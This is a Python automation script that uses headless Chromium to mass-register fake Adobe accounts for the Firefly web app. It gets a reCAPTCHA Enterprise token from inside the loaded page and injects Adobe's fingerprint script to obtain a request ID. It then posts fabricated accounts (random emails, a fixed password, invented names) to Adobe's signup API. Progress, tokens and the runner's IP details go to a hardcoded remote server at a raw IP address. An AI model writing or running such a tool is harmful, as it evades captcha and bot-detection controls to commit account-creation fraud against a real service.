import asyncio, json, random, string, sys, urllib.request, urllib.parse, traceback, os, hashlib
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
import subprocess

REPORT_URL = 'http://23.148.228.38:8001/report'
SITEKEY = '6LcGE-4ZAAAAAG2tFdbr7QqpimWAPqhLjI8_O_69'

def report(data):
    try:
        req = urllib.request.Request(REPORT_URL, data=json.dumps(data).encode(),
            headers={'Content-Type':'application/json'}, method='POST')
        urllib.request.urlopen(req, timeout=10)
        print('REPORTED', data.get('stage','?'), flush=True)
    except Exception as e:
        print('REPORT_ERR', str(e)[:150], flush=True)

def get_ip():
    try:
        return subprocess.check_output(['curl','-s','--max-time','8','https://ipinfo.io/json']).decode()
    except Exception:
        return '{}'

def rn(n): return ''.join(random.choices(string.ascii_lowercase, k=n))

def post_json(url, payload, headers):
    req = urllib.request.Request(url, data=json.dumps(payload).encode(),
        headers={'Content-Type':'application/json', **headers}, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode()[:500]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:500]
    except Exception as e:
        return 0, 'ERR:' + str(e)[:150]

def build_url():
    relay = '5f63be8b-2d0d-4c9c-ac94-09add7650fde'
    state = json.dumps({"name":"AccessTokenFlow","side":"popup","data":{"access_token":"","returnOrigin":"https://auth-light.identity.adobe.com","client_id":"projectx_webapp","clientId":"projectx_webapp","relay":relay,"useMessageChannel":True}}, separators=(",",":"))
    se = urllib.parse.quote(state)
    cb = f'https://ims-na1.adobelogin.com/ims/adobeid/projectx_webapp/AdobeID/token?redirect_uri=https%3A%2F%2Fauth-light.identity.adobe.com%2Fwrapper-popup-helper%2Findex.html&state={se}&code_challenge_method=plain&use_ms_for_expiry=false'
    scope = 'AdobeID,firefly_api,openid'
    return (f'https://auth.services.adobe.com/de_DE/deeplink.html?deeplink=signup&callback={urllib.parse.quote(cb,safe="")}&client_id=projectx_webapp&scope={urllib.parse.quote(scope,safe="")}&state={se}&relay={relay}&locale=de_DE&flow_type=token&idp_flow_type=create_account&dl=true&s_p=google%2Cfacebook%2Capple%2Cmicrosoft%2Cline%2Ckakao&response_type=token&code_challenge_method=plain&redirect_uri=https%3A%2F%2Fauth-light.identity.adobe.com%2Fwrapper-popup-helper%2Findex.html&use_ms_for_expiry=false#/signup')

async def main():
    n = int(os.getenv('RUNNER_N', '1'))
    runner = os.getenv('RUNNER_NAME', '')
    info = {}
    try:
        j = json.loads(get_ip())
        info = {'ip': j.get('ip',''), 'cc': j.get('country',''), 'org': j.get('org','')}
    except Exception:
        pass
    info['runner'] = runner
    report({'stage':'api2_started','n': n, **info})
    try:
        from playwright.async_api import async_playwright
        async with async_playwright() as p:
            b = await p.chromium.launch(headless=True, args=['--no-sandbox','--disable-dev-shm-usage'])
            ctx = await b.new_context(locale='de-DE', timezone_id='Europe/Vienna',
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36')
            pg = await ctx.new_page()
            URL = build_url()
            await pg.goto(URL, wait_until='domcontentloaded', timeout=90000)
            await pg.wait_for_timeout(12000)
            cap = await pg.evaluate('''() => {
                const scripts = [...document.querySelectorAll('script[src*="recaptcha"]')].map(s => s.src.slice(0,150));
                return {grecaptcha: typeof window.grecaptcha, scripts};
            }''')
            report({'stage':'page_captcha','cap':cap,'n': n, **info})
            token = None
            try:
                token = await pg.evaluate('''(sk) => grecaptcha.enterprise.execute(sk, {action: 'homepage'})''', SITEKEY)
            except Exception as e:
                report({'stage':'page_exec_exc','err':str(e)[:120],'n': n, **info})
            report({'stage':'page_token','ok': bool(token and len(token)>50), 'len': len(token or ''), 'token': (token or '')[:40], 'n': n, **info})
            bfp_req = None
            try:
                await pg.add_script_tag(url='https://bfp.adobe.com/bfp/v1/bfp.min.js')
                await pg.wait_for_timeout(2500)
                bfp_res = await pg.evaluate('''async () => {
                    const out = {loaded: !!window.BFPJS};
                    if (!window.BFPJS) return out;
                    try {
                        const mod = await window.BFPJS.load();
                        out.modKeys = Object.keys(mod).slice(0,20);
                        out.getType = typeof mod.get;
                        out.publishType = typeof mod.publish;
                        const comps = await mod.get();
                        out.compsType = typeof comps;
                        if (mod.publish) {
                            const reqId = await mod.publish();
                            out.requestId = typeof reqId === 'string' ? reqId.slice(0,80) : JSON.stringify(reqId).slice(0,80);
                        }
                    } catch(e) { out.err = String(e).slice(0,150); }
                    return out;
                }''')
                report({'stage':'bfp_publish','bfp':bfp_res,'n': n, **info})
                if bfp_res.get('requestId'):
                    bfp_req = bfp_res['requestId']
            except Exception as e:
                report({'stage':'bfp2_exc','err':str(e)[:150],'n': n, **info})
            em = f'{rn(7)}.{rn(8)}.awsapps.com@{rn(4)}.{rn(4)}.{random.choice(["es","edu","jp"])}'
            body = {
                "account": {
                    "userId": em, "email": em,
                    "emailHash": hashlib.sha256(em.encode()).hexdigest(),
                    "password": "Abcd1234!xyz",
                    "firstName": "Kundby", "lastName": "Olivela",
                    "countryCode": "AT",
                    "dateOfBirth": {"day": 12, "month": 3, "year": 1995},
                    "marketingConsent": {"consentType": "EMAIL", "consented": False}
                }
            }
            if token and len(token) > 50:
                body["captchaResponse"] = token
            headers = {'X-IMS-CLIENTID': 'projectx_webapp'}
            st, resp = post_json('https://auth.services.adobe.com/signin/v1/accounts', body, headers)
            report({'stage':'api2_reg','status':st,'resp':resp[:300],'email':em,'token_len':len(token or ''),'n': n, **info})
            if bfp_req:
                headers2 = dict(headers)
                headers2['X-IMS-BFP-REQUEST-ID'] = bfp_req
                st3, resp3 = post_json('https://auth.services.adobe.com/signin/v1/accounts', body, headers2)
                report({'stage':'api2_bfp_hdr','status':st3,'resp':resp3[:300],'email':em,'n': n, **info})
            await b.close()
    except Exception as e:
        report({'stage':'api2_exception','err':str(e)[:200],'n': n, **info})
        traceback.print_exc()

asyncio.run(main())
